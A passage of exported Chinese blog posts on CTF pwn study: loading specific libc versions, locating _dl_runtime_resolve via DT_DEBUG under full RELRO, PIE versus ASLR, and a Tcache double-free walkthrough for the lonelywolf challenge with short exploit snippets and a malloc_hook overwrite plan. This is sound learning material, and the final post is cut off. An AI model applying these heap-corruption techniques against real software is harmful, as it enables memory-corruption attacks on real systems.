[{"title":"ubuntu加载不同版本libc","url":"/2021/08/17/ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/","content":"<html><head></head><body><h2 id=\"\"><a class=\"post-anchor\" href=\"#\"></a></h2><h4 id=\"1）review\">1）review<a class=\"post-anchor\" href=\"#1）review\"></a></h4><p> 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的–只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。</p>\n<p>然后我就是这样一步一步地变得不会调试的。</p>\n<p>但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。</p>\n<p>呜呜呜，我居然一直忽略了它的灵魂</p>\n<p>所以这一次我一定要解决掉这个问题。</p>\n<p>之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。</p>\n<p>目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。</p>\n<h4 id=\"2）原理\">2）原理<a class=\"post-anchor\" href=\"#2）原理\"></a></h4><p>在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。</p>\n<p>但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。</p>\n<h5 id=\"1）LD-PRELOAD\">1）LD_PRELOAD<a class=\"post-anchor\" href=\"#1）LD-PRELOAD\"></a></h5><p>首先就是我们在脚本前加载的<code>LD_PRELOAD</code>这个东西。一般的用法是<code>env={\"LD_PRELOAD\":libc_path}</code></p>\n<p>它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。</p>\n<p>这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>\n<p>换句话说我们可以通过指定这个环境变量来指定特定的libc版本。</p>\n<h5 id=\"2）LD-LIBRARY-PATH和LIBRARY-PATH\">2）LD_LIBRARY_PATH和LIBRARY_PATH<a class=\"post-anchor\" href=\"#2）LD-LIBRARY-PATH和LIBRARY-PATH\"></a></h5><p>LD_LIBRARY_PATH用于在<em><strong>程序加载运行期间</strong></em>查找动态链接库时指定除了系统默认路径之外的其他路径.</p>\n<p>LIBRARY_PATH环境变量用于在<em><strong>程序编译期间</strong></em>查找动态链接库时指定查找共享库的路径</p>\n<p>其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。</p>\n<p>并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以<code>LD_PRELOAD</code>还是比较常见。</p>\n<p>相关（？）环境变量大概就这么多，然后是某些特殊的段。</p>\n<h5 id=\"1）-PT-INTERP\">1） PT_INTERP<a class=\"post-anchor\" href=\"#1）-PT-INTERP\"></a></h5><p>储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。</p>\n<p>我们可以修改这个段的内容来指定我们需要的链接器。</p>\n<h4 id=\"汇总\">汇总<a class=\"post-anchor\" href=\"#汇总\"></a></h4><p>综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。</p>\n<p>准备好了以后我们通过脚本将题目<code>PT_INTERP</code>段修改，然后通过<code>LD_PRELOAD</code>指定我们需要的libc的路径即可。</p>\n<h4 id=\"实际操作\">实际操作<a class=\"post-anchor\" href=\"#实际操作\"></a></h4><p>我们以lonelywolf为例。</p>\n<p>有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。</p>\n<h3 id=\"参考\">参考<a class=\"post-anchor\" href=\"#参考\"></a></h3><p><a href=\"https://www.cnblogs.com/net66/p/5609026.html\"></a><a href=\"https://www.cnblogs.com/net66/p/5609026.html\">LD_PRELOAD的偷梁换柱之能</a></p>\n</body></html>","tags":["linux primary"]},{"title":"ret2dl_advanced","url":"/2021/08/02/ret2dl_advanced/","content":"<html><head></head><body><h1 id=\"\"><a class=\"post-anchor\" href=\"#\"></a></h1><h2 id=\"ret2dl-advanced\">ret2dl_advanced<a class=\"post-anchor\" href=\"#ret2dl-advanced\"></a></h2><h3 id=\"1-review\">1)review<a class=\"post-anchor\" href=\"#1-review\"></a></h3><p>当FULL RELRO保护开启时，通过 <code>dl_run_time</code>来获取libc基址的方式几乎无解。</p>\n<p>但是我们仍然能够找到某种方式来getshell。</p>\n<p>相关论文中给出一种解决方案，即通过<code>dt_bug</code>入口找到突破点。</p>\n<p>(Ps:为什么找不到相关的中文文章)</p>\n<h3 id=\"2）dt-dbg？\">2）dt_dbg？<a class=\"post-anchor\" href=\"#2）dt-dbg？\"></a></h3><p><code>dt_dbg</code>这个概念实际上并不新鲜，简单来说它可以被包含在<code>libc.so</code>文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个<code>libc.so</code>文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。</p>\n<p><code>dt_dubug</code>用于指向<code>type_r_debug</code>这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。</p>\n<p>此外，这个结构体的<code>r_map</code>域保存了指向<code>link_map</code>的链接表表头的指针。</p>\n<p>也就是<code>dt_dbg</code>指向<code>type_r_debug</code>，且<code>type_r_debug</code>维护了指向<code>link_map</code>的指针。</p>\n<p><code>r_debug</code>具体代码如下:</p>\n<pre><code class=\"c\">/* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable's dynamic section has a DT_DEBUG element, the run-time linker sets that element's value to the address where this structure can be found. */\n\nstruct r_debug\n  { \n    int r_version;              /* Version number for this protocol. */\n\n    struct link_map *r_map;     /* Head of the chain of loaded objects. */\n\n    /* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */\n    ElfW(Addr) r_brk;\n    enum\n      { \n        /* This state value describes the mapping change taking place when the `r_brk' address is called. */\n        RT_CONSISTENT,          /* Mapping change is complete. */\n        RT_ADD,                 /* Beginning to add a new object. */\n        RT_DELETE               /* Beginning to remove an object mapping. */\n      } r_state;\n\n    ElfW(Addr) r_ldbase;        /* Base address the linker is loaded at. */\n  };\n</code></pre>\n<p>实操一遍</p>\n<p>随便写一个无output的栈溢出。</p>\n<pre><code class=\"bash\">fur1n@ubuntu:~/pwn$ readelf -d ret2dl\n\nDynamic section at offset 0xdb8 contains 27 entries:\n  Tag        Type                         Name/Value\n...\n 0x0000000000000015 (DEBUG)              0x0\n\n</code></pre>\n<p>在没有运行的时候<code>dt_dbg</code>为空。</p>\n<p>在关闭aslr的情况下找到<code>dt_debug</code>并不困难。</p>\n<p>gdb使用<code>elfheader</code>命令查看相关elfheader的地址，可以找到<code>.dynamic</code></p>\n<p>段的地址。</p>\n<pre><code class=\"bash\">pwndbg&gt; x/50gx 0x600e20\n...\n0x600ee0:    0x0000000000000015    0x00007ffff7ffe140\n</code></pre>\n<p>0x00007ffff7ffe140也就是<code>dt_debug</code>指向的<code>r_debug</code>的地址。</p>\n<pre><code class=\"bash\">pwndbg&gt; x/20gx 0x00007ffff7ffe140\n0x7ffff7ffe140 &lt;_r_debug&gt;:    0x0000000000000001    0x00007ffff7ffe170\n0x7ffff7ffe150 &lt;_r_debug+16&gt;:    0x00007ffff7de3f40    0x0000000000000000\n0x7ffff7ffe160 &lt;_r_debug+32&gt;:    0x00007ffff7dd3000    0x0000000000000000\n0x7ffff7ffe170:    0x0000000000000000    0x00007ffff7ffe700\n0x7ffff7ffe180:    0x0000000000600e20    0x00007ffff7ffe710\n0x7ffff7ffe190:    0x0000000000000000    0x00007ffff7ffe170\n0x7ffff7ffe1a0:    0x0000000000000000    0x00007ffff7ffe6e8\n0x7ffff7ffe1b0:    0x0000000000000000    0x0000000000600e20\n0x7ffff7ffe1c0:    0x0000000000600f00    0x0000000000600ef0\n0x7ffff7ffe1d0:    0x0000000000000000    0x0000000000600ea0\n</code></pre>\n<p><code>r_debug</code>维护的第一个结构体，也就是<code>link_map</code>地址，即<code>0x00007ffff7ffe170</code></p>\n<pre><code class=\"bash\">0x7ffff7ffe140 &lt;_r_debug&gt;:    0x0000000000000001    0x00007ffff7ffe170\n</code></pre>\n<p>这样我们就从<code>dt_debug</code>找到了<code>link_map</code>的地址。</p>\n<p>虽然但是。</p>\n<p>只是找到<code>link_map</code>没啥用。</p>\n<p>我们的最终目的还是寻找到<code>dl_runtime_resolve</code>函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。</p>\n<p>能从动态链接库中找到<code>dl_runtime_resolve</code>函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到<code>dl_runtime_resolve</code>函数地址，那么问题就迎刃而解了。</p>\n<p>那么如何寻找呢？</p>\n<p>实际比较简单（无aslr的情况），只要根据<code>link_map</code>的结构依次顺下来就好了。</p>\n<p>上一个section我们找到了<code>link_map</code>的地址，接下来我们通过<code>link_map</code>逐步找到</p>\n<p><code>dl_runtime_resolve</code>。</p>\n<p>首先我们找到<code>libc.so.6</code>文件。</p>\n<pre><code class=\"bash\">pwndbg&gt; x/20gx 0x00007ffff7ffe170\n0x7ffff7ffe170:    0x0000000000000000    0x00007ffff7ffe700\n0x7ffff7ffe180:    0x0000000000600e20    0x00007ffff7ffe710\n---\npwndbg&gt; x/20gx 0x00007ffff7ffe700\n0x7ffff7ffe700:    0x0000000000000000    0x0000000000000000\n0x7ffff7ffe710:    0x00007ffff7ffb000    0x00007ffff7ffebb0\n---\npwndbg&gt; x/s 0x00007ffff7ffebb0\n0x7ffff7ffebb0:    \"linux-vdso.so.1\"\n---\npwndbg&gt; x/10gx 0x00007ffff7ffe710\n0x7ffff7ffe710:    0x00007ffff7ffb000    0x00007ffff7ffebb0\n0x7ffff7ffe720:    0x00007ffff7ffb3a0    0x00007ffff7fe2000\n---\npwndbg&gt; x/10gx 0x00007ffff7fe2000\n0x7ffff7fe2000:    0x00007ffff79e2000    0x00007ffff7ffedd0\n---\npwndbg&gt; x/s 0x00007ffff7ffedd0\n0x7ffff7ffedd0:    \"/lib/x86_64-linux-gnu/libc.so.6\"\n</code></pre>\n<p>即<code>0x00007ffff7ffedd0</code>。</p>\n<p>0x3即<code>GOT[]</code>入口</p>\n<pre><code class=\"bash\">pwndbg&gt; x/30gx 0x00007ffff7dccb80\n...\n0x7ffff7dccc30:    0x0000000000000003    0x00007ffff7dcd000\n</code></pre>\n<p>找到GOT[3]</p>\n<pre><code class=\"bash\">pwndbg&gt; x/5gx 0x00007ffff7dcd000\n0x7ffff7dcd000:    0x00000000003eab80    0x00007ffff7fe2000\n0x7ffff7dcd010:    0x00007ffff7dea8f0    0x00007ffff7b70a10\n</code></pre>\n<pre><code class=\"bash\">pwndbg&gt; xinfo 0x00007ffff7dea8f0\nExtended information for virtual address 0x7ffff7dea8f0:\n\n  Containing mapping:\n    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so\n\n  Offset information:\n         Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0\n         File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0\n      File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0\n         File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0\n\n Containing ELF sections:\n               .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0\n</code></pre>\n<h3 id=\"3）exploitation\">3）exploitation<a class=\"post-anchor\" href=\"#3）exploitation\"></a></h3><p>在无aslr并已经获取到<code>dl_runtime_resolve</code>的情况下的利用和patial relro相似。</p>\n<p>有aslr的情况。。</p>\n<p>我也不会。</p>\n<h3 id=\"4-refrence\">4)refrence<a class=\"post-anchor\" href=\"#4-refrence\"></a></h3><p><a href=\"http://rk700.github.io/2015/04/09/dt_debug-read/\">通过DT_DEBUG来获得各个库的基址</a></p>\n<p><a href=\"https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico\">How the ELF Ruined Christmas</a></p>\n<p><a href=\"https://ypl.coffee/dl-resolve-full-relro/\">Finding link_map and _dl_runtime_resolve() under full RELRO</a></p>\n<p>————————————————tbc——————————————————-</p>\n</body></html>","tags":["stack"]},{"title":"ELF文件下对于PIE保护和ASLR的重新认识","url":"/2021/08/13/ELF%E6%96%87%E4%BB%B6%E4%B8%8B%E5%AF%B9%E4%BA%8EPIE%E4%BF%9D%E6%8A%A4%E5%92%8CASLR%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/","content":"<html><head></head><body><h3 id=\"ELF文件下对于PIE保护和ASLR的重新认识\">ELF文件下对于PIE保护和ASLR的重新认识<a class=\"post-anchor\" href=\"#ELF文件下对于PIE保护和ASLR的重新认识\"></a></h3><h4 id=\"0）\">0）<a class=\"post-anchor\" href=\"#0）\"></a></h4><p>​    复现红色高跟鞋的时候，在ida修复swithc结构的时候碰见了一个问题。因为题目的源文件是有pie保护的，所以ida中的地址是很难看的随机化模式。虽然这些随机化的地址对于我们patch文件毫无影响，但是就是突发奇想，看看能不能找到方法来通过patch将elf文件的pie保护给禁用。</p>\n<h4 id=\"1）\">1）<a class=\"post-anchor\" href=\"#1）\"></a></h4><p>​    如果用010editor打开一个PE文件，我们能够很方便的通过修改PE头来禁用掉Windows程序的ASLR保护。这是因为程序本身其实并不是位置无关的。</p>\n<p>ASLR在PE文件上的开启与否实际上就是PE头上标识符的区分，总的来说ASLR是操作系统的功能，而不是程序本身的特性，以ASLR ON 编译，也只是给程序加上了能被ASLR保护识别的标识符。所以我们只需要patch掉这个标识符，就能够改变程序的地址随机化状态。</p>\n<p>也正是在寻找方法的过程中，我逐渐认识到虽然PIE保护和ASLR表现形式都是地址随机化，但是两者的原理以及实现的方式并不一样，甚至大相径庭。</p>\n<p>在维基百科上，我们能够清楚地看到PIE的全称是Position-independence Executable，位置无关可执行文件。</p>\n<p>这个概念并不是很常见，相对更为常见的是PIC，Position-independence Code，位置无关代码。</p>\n<p>PIC和PIE只差了一个字母，意思也相近。但PIC更多的是在重定位中被提及。源码通过汇编器生成可重定位目标文件，此时它的代码就是位置无关，从0开始的，PIE和PIC的概念相近，当编译完成，可执行文件的便是位置无关了，我们无法改变这一点，也就是说，被PIE保护的文件，并不是通过给头文件加上标识符，使系统开启或关闭随机，而是文件本身便是位置无关吗，是随机的。</p>\n<p>​    然而，虽然文件本身是位置无关的，但是实际地址是否随机，还是要看进程中aslr是否开启，如果将进程aslr关闭，那么调试时我们看到的地址依旧不是随机的。这里主要涉及到重定位的相关知识，之后会写一篇笔记来试图深入系统重定位过程与地址随机化之间的关系。</p>\n</body></html>","tags":["mess"]},{"title":"Tcahce学习","url":"/2021/08/17/Tcache%E5%AD%A6%E4%B9%A0/","content":"<html><head></head><body><h2 id=\"\"><a class=\"post-anchor\" href=\"#\"></a></h2><h1 id=\"Tcahce学习\">Tcahce学习<a class=\"post-anchor\" href=\"#Tcahce学习\"></a></h1><h2 id=\"0）review\">0）review<a class=\"post-anchor\" href=\"#0）review\"></a></h2><p>说是Tcache学习，实际上是lonelywolf的复现。</p>\n<p>网上wp都是神仙写的，一点也不萌新友好。我都看不懂（）</p>\n<p>打开题发现这个菜单题好常规。</p>\n<p>但是libc是2.27，难度会稍微高一点。而且这个2.27是魔改过的，加入了2.29才有的key，为Tcache加入了检查机制。                                                                                                   具体的参考可以看<a href=\"https://blog.csdn.net/chennbnbnb/article/details/109284780\">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a>。但是在这道题里面充其量算一个trick而不是核心考点。</p>\n<h2 id=\"1）漏洞点\">1）漏洞点<a class=\"post-anchor\" href=\"#1）漏洞点\"></a></h2><pre><code class=\"c\">unsigned __int64 delete()\n{\n  __int64 v1; // [rsp+0h] [rbp-18h]\n  unsigned __int64 v2; // [rsp+8h] [rbp-10h]\n\n  v2 = __readfsqword(0x28u);\n  __printf_chk(1LL, \"Index: \");\n  __isoc99_scanf(&amp;number, &amp;v1);\n  if ( !v1 &amp;&amp; buf )\n    free(buf);\n  return __readfsqword(0x28u) ^ v2;\n}\n</code></pre>\n<p>漏洞点。经典uaf。</p>\n<p>之前看wp有人说edit函数里面有空字节溢出，问题大概出在++v == v1上，正确写法应该是v0++，不然判断结束但是v0多加了一次。</p>\n<pre><code class=\"c\">while ( 1 )\n        {\n          read(0, v0, 1uLL);\n          if ( *v0 == '\\n' )\n            break;\n          if ( ++v0 == v1 )\n            return __readfsqword(0x28u) ^ v4;\n        }\n        *v0 = 0;\n</code></pre>\n<p>然后有一个比较怪的点就是这里的 <code> __readfsqword();</code>。很明显他是一个和读取有关的函数，但是ida根本点不进去。</p>\n<p>后面我才知道这个函数是和canary保护有关。</p>\n<p>根据微软官方文档<a href=\"https://docs.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-160\">…</a>这个函数的功能是【通过FS段开头的偏移来读取内存中的数据】，这里的FS段是段寄存器。定义大概是运行时被赋予功能，然后在64位win下指向运行中的os的被定义的结构，被os用来加载特定线程段内存数据。</p>\n<p>但是好像说了和没说一样。</p>\n<p>回到汇编语言的界面，似乎找到点不进去的原因了。具体的内容还是要码住。<a href=\"https://toutiao.io/posts/o5yed8w/preview\">Canary安全机制原理实战分析</a></p>\n<p>![image-20210811161707509](/Users/rin/Library/Application Support/typora-user-images/image-20210811161707509.png)</p>\n<h2 id=\"2）漏洞利用\">2）漏洞利用<a class=\"post-anchor\" href=\"#2）漏洞利用\"></a></h2><h3 id=\"1）Tcache-double-free\">1）Tcache double free<a class=\"post-anchor\" href=\"#1）Tcache-double-free\"></a></h3><p>之前也说过了，这个libc是魔改过的，增加了2.29才有的key，所以需要绕过。</p>\n<p>虽然但是，我连普通的Tcache的题都不太清楚，正好找到一个讲得特别详细的视频，那就跟着做好了，顺便复习一下。</p>\n<pre><code class=\"python\">add(0,0x68)\nfree(0)\ngdb.attach(p)\npause()\n</code></pre>\n<p>首先先分配再释放一下，看看这个题具体的内存分布有什么特点。</p>\n<pre><code class=\"c#\">pwndbg&gt; hea\nAllocated chunk | PREV_INUSE\nAddr: 0x55e9c994c000\nSize: 0x251\n\nFree chunk (tcache) | PREV_INUSE\nAddr: 0x55e9c994c250\nSize: 0x71\nfd: 0x00\n\nTop chunk | PREV_INUSE\nAddr: 0x55e9c994c2c0\nSize: 0x20d41\n\npwndbg&gt; bin\ntcachebins\n0x70 [  1]: 0x55e9c994c260 ◂— 0x0\nfastbins\n0x20: 0x0\n0x30: 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x0\n0x80: 0x0\nunsortedbin\nall: 0x0\nsmallbins\nempty\nlargebins\nempty\n</code></pre>\n<p>之前一直不是很清楚</p>\n<pre><code class=\"c\">Allocated chunk | PREV_INUSE\nAddr: 0x55e9c994c000\nSize: 0x251\n</code></pre>\n<p>这个堆块的作用，之前问学委，学委说是一些被缓存的函数啥的？？实际上是tcache的控制区域。大概就是保存Tcache chunk的一些信息。</p>\n<p>然后这边</p>\n<pre><code class=\"c\">0x70 [  1]: 0x55e9c994c260 ◂— 0x0 //说明0x70大小的Tcache里只有一个Tcache chunk，\n</code></pre>\n<pre><code>pwndbg&gt; x/300gx 0x562fcfd39000\n0x562fcfd39000:    0x0000000000000000    0x0000000000000251\n0x562fcfd39010:    0x0000010000000000    0x0000000000000000\n0x562fcfd39020:    0x0000000000000000    0x0000000000000000\n0x562fcfd39030:    0x0000000000000000    0x0000000000000000\n0x562fcfd39040:    0x0000000000000000    0x0000000000000000\n0x562fcfd39050:    0x0000000000000000    0x0000000000000000\n0x562fcfd39060:    0x0000000000000000    0x0000000000000000\n0x562fcfd39070:    0x0000000000000000    0x0000562fcfd39260\n</code></pre>\n<p>这是控制堆块的部分结构</p>\n<p><code>0x562fcfd39010:    0x0000010000000000    0x0000000000000000</code>中，1说明只有一个Tcache。</p>\n<p>T擦车堆块的首地址也记录在内。从<code>0x562fcfd39050</code>开始分别记录0x20到0x70的Tcache chunk的首地址，比如<code>0x562fcfd39070:    0x0000000000000000    0x0000562fcfd39260</code>,记录的就是0x70大小chunk的首地址。</p>\n<blockquote>\n<p>喜闻乐见地被一个奇怪的知识点带偏了，大概就是setvbuf在pwn题中的原理。其实这个也是不陌生的一个概念了，但是一直没有深究，有机会可以写一篇文章探讨一下。</p>\n</blockquote>\n<pre><code>pwndbg&gt; x/20gx 0x56533012f250\n0x56533012f250:    0x0000000000000000    0x0000000000000071\n0x56533012f260:    0x0000000000000000    0x000056533012f010\n</code></pre>\n<p>我们到Tcache的地址中看一看，会发现<code>0x56533012f260:    0x0000000000000000    0x000056533012f010</code>处的<code>0x000056533012f010</code>，这是一个key值。</p>\n<h4 id=\"2-29下Tcahce-double-free的检测\">2.29下Tcahce double free的检测<a class=\"post-anchor\" href=\"#2-29下Tcahce-double-free的检测\"></a></h4><p>之前也说过在2.29中新增了对于Tcahce double free的检测，也就是这里的key。检测的大致思路是</p>\n<p>对于每一个tcache中的chunk，增加了一个key指针，用于指向所属的tcache结构体(也就是修改的原本只有一行的tcache_entry)</p>\n<pre><code class=\"c\">typedef struct tcache_entry\n{\n  struct tcache_entry *next;  //链表指针，对应chunk中的fd字段\n  /* This field exists to detect double frees.  */\n  struct tcache_perthread_struct *key;  //指向所属的tcache结构体，对应chunk中的bk字段\n} tcache_entry;\n</code></pre>\n<p>也就是所谓的key对应的就是chunk的bk字段。</p>\n<p>当chunk被free，放入Tcache链表时，操作如下。</p>\n<pre><code class=\"c\"> \nstatic __always_inline void\ntcache_put(mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);\n \n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e-&gt;key = tcache;  //设置所属的tcache\n \n  e-&gt;next = tcache-&gt;entries[tc_idx];//单链表头插法\n  tcache-&gt;entries[tc_idx] = e;  \n \n  ++(tcache-&gt;counts[tc_idx]); //计数增加\n}\n</code></pre>\n<p>然后进行free操作</p>\n<pre><code class=\"c\">    size_t tc_idx = csize2tidx(size);\n    //只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查\n    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)\n    {\n      /* Check to see if it's already in the tcache.  */\n      tcache_entry *e = (tcache_entry *)chunk2mem(p);\n \n      /*\n        如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来\n        如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free\n      */\n      if (__glibc_unlikely(e-&gt;key == tcache))//剪枝\n      {\n        tcache_entry *tmp;\n        LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx);\n        for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)\n          if (tmp == e)\n            malloc_printerr(\"free(): double free detected in tcache 2\");\n      }\n \n      if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  //通过检查，放入tcahce中\n      {\n        tcache_put(p, tc_idx);\n        return;\n      }\n    }\n</code></pre>\n<p>源码太长不看，其实就是bk位相当于一个key。如果double free了就会报错。绕过方式就是把这个bk位改成其他的东西。比较简单。所以我们可以通过edit绕过这个检测。</p>\n<p>大致是</p>\n<pre><code class=\"python\">add(0,0x78)\nfree(0)\nedit(0,b\"aaaa\")\nfree(0)\nshow(0)\n</code></pre>\n<p>再进行接收，就能获取一个我们的堆地址。接着就能算出堆基址。</p>\n<p>然后我们需要构造出unsortedbin chunk、</p>\n<p>但是题目限制了分配堆块的大小，我们无法直接获得一个unsortedbin chunk。。</p>\n<p>那么有什么办法能构造出unsortedbin呢？<br>回到Tcache的控制堆块，并且想到我们存在的double free，我们是否能通过double free来造成Tcache的控制堆块的任意写然后来修改被控制的Tcache的信息？比如数量和地址和大小？</p>\n<p>如果我们把数量改成七，大小改成我们想要的其他的，然后再将其申请并释放，我们是不是就可以获得unsortedbin chukn了？</p>\n<p>然后可以直接通过unsortedbin中的地址来减去偏移获得libc基址，然后直接one_gadget打malloc_hook。</p>\n<p>总体的利用思路是比较常规的，尤其是获得unsortedbin的地址之后的操作基本上就是模版化。</p>\n<p>然后比较关键的就是前面对于Tcache 检测的绕过以及修改Tcache控制区域来构造unsorted’bin。</p>\n<h4 id=\"调试\">调试<a class=\"post-anchor\" href=\"#调试\"></a></h4><p>接下来是具体的调试部分，我力争把每道题都完整地调出来，只清楚原理不能实战是没有任何意义的。</p>\n<p>但是我们首先就是要解决libc的问题。虽然我们已经找到解决问题的方法，但是中途是否会出现其他的问题这个还不得而知。</p>\n<h3 id=\"Tcache-利用\">Tcache 利用<a class=\"post-anchor\" href=\"#Tcache-利用\"></a></h3><p>不是学习不是学习不是学习，</p>\n<p>例题是lctf2018的easyheap。</p>\n<h4 id=\"漏洞点\">漏洞点<a class=\"post-anchor\" href=\"#漏洞点\"></a></h4><p>一个又明显又不明显的漏洞、来自于输入后会把chunk_ptr置为0。</p>\n<p>然后联想到malloc的内存分配机制，如果我们malloc一个16*n+8型的chunk，由于ptmalloc的内存复用机制，我们可以利用这个置零的漏洞使得物理相邻的下一个chunk的prevsize位包括previnuse位为0。然后构造堆叠。</p>\n<pre><code class=\"c\">unsigned __int64 __fastcall sub_BEC(_BYTE *a1, int a2)\n{\n  signed int v3; // [rsp+14h] [rbp-Ch]\n  unsigned __int64 v4; // [rsp+18h] [rbp-8h]\n\n  v4 = __readfsqword(0x28u);\n  v3 = 0;\n  if ( a2 )\n  {\n    while ( 1 )\n    {\n      read(0, &amp;a1[v3], 1uLL);\n      if ( a2 - 1 &lt; (unsigned int)v3 || !a1[v3] || a1[v3] == 10 )\n        break;\n      ++v3;\n    }\n    a1[v3] = 0;\n    a1[a2] = 0;//loophole\n  }\n  else\n  {\n    *a1 = 0;\n  }\n  return __readfsqword(0x28u) ^ v4;\n}\n</code></pre>\n<p>然后又注意到我们最多只能分配十个堆块，除去需要填满Tcache的七个堆块，也就是我们只能分配十个相同大小的堆块。</p>\n<p>在完成这道题之前我们需要先理解unsortedbin 泄漏libc的原理。</p>\n<p>包括ciscn lonelywolf也是利用到了这一点。</p>\n<h4 id=\"参考\">参考<a class=\"post-anchor\" href=\"#参考\"></a></h4><p><a href=\"https://blog.csdn.net/A951860555/article/details/116910945\">2021第十四届全国大学生信息安全竞赛WP（CISCN）– pwn部分</a></p>\n<p><a href=\"https://blog.csdn.net/chennbnbnb/article/details/109284780\">glibc2.31下的新double free手法/字节跳动pwn题gun题解</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1Sy4y1W7h2\">CISCN2021 lonelywolf</a></p>\n</body></html>","tags":["Heap"]},{"title":"解决gcc无法编译32位程序的问题","url":"/2021/10/27/%E8%A7%A3%E5%86%B3gcc%E6%97%A0%E6%B3%95%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%97%AE%E9%A2%98/","content":"<html><head></head><body><h3 id=\"1）前言\">1）前言<a class=\"post-anchor\" href=\"#1）前言\"></a></h3><p>​    之前一直被gcc无法编译32位程序而困扰，但是问题一直拖着没有解决，趁着今天比较闲，把这个问题彻底解决一下。</p>\n<h3 id=\"2-过程\">2)过程<a class=\"post-anchor\" href=\"#2-过程\"></a></h3><p>​    首先我们尝试编译32位程序，gcc报错：<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.29.31.png\" data-caption=\"截屏2021-10-27 下午8.29.31\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.29.31.png\" alt=\"截屏2021-10-27 下午8.29.31\"></a></p>\n<p>​    缺少头文件，实则是没有安装多架构gcc。</p>\n<p>​    试图安装，失败，报错如下：<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.30.23.png\" data-caption=\"截屏2021-10-27 下午8.30.23\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%888.30.23.png\" alt=\"截屏2021-10-27 下午8.30.23\"></a></p>\n<p>​    这里有个坑了我好久的东西，就是这个报错</p>\n<p>E: Unable to correct problems, you have held broken packages.</p>\n<p>​    无法修正问题，你持有held broken的软件包。</p>\n<p>​    我一直没有理解正确这个held的意思，我以为是持有的意思，所以一直以来这句话在我眼中的意思是，你已经有这个软件包了，但是你不能安装。</p>\n<p>​    但实际上，但凡熟悉过apt或者dkpg的一些命令，或者但凡对linux文件系统稍微熟悉一点都知道其实hold是为了防止更新不想更新的软件包，而特殊设置的功能。通过apt- mark或者dpkg命令 ，从apt-get中将特定的软件包的更新排除。而这道题的报错就是源于这点–gcc-7-multilib等依赖的软件包版本不对，但是由于held，所以并没有被更新。</p>\n<p>​    但是通过<code>dpkg --get-selections | grep 